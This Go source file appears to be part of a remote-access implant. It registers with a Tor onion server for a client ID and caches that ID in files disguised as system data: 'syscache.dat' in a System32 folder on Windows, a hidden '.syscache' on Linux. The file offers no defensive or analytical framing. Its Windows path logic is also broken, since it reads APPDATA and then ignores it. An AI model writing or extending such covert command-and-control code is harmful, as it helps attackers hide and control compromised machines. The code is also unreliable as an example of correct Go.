package pkg

import (
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

const (
	client_file = "client_file"
)

func getFilePath() string {
	var dir string

	switch runtime.GOOS {
	case "windows":
		appData := os.Getenv("APPDATA")
		if appData == "" {
			appData = "."
		}
		dir = filepath.Join(dir, "System32")
		_ = os.MkdirAll(dir, 0755)
		return filepath.Join(dir, "syscache.dat")
	case "linux":
		home, err := os.UserHomeDir()
		if err != nil {
			home = "."
		}
		dir := filepath.Join(home, ".config")
		_ = os.MkdirAll(dir, 0755)
		return filepath.Join(dir, ".syscache")
	}

	return filepath.Join(dir, client_file)
}

func CreateClient(client *http.Client, onionURL string) (string, error) {
	client_file_path := getFilePath()

	if data, err := os.ReadFile(client_file_path); err == nil {
		return strings.TrimSpace(string(data)), nil
	}

	resp, err := client.Get(onionURL + "/register")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	clientID := strings.TrimSpace(string(body))

	_ = os.WriteFile(client_file_path, []byte(clientID), 0644)

	return clientID, nil
}
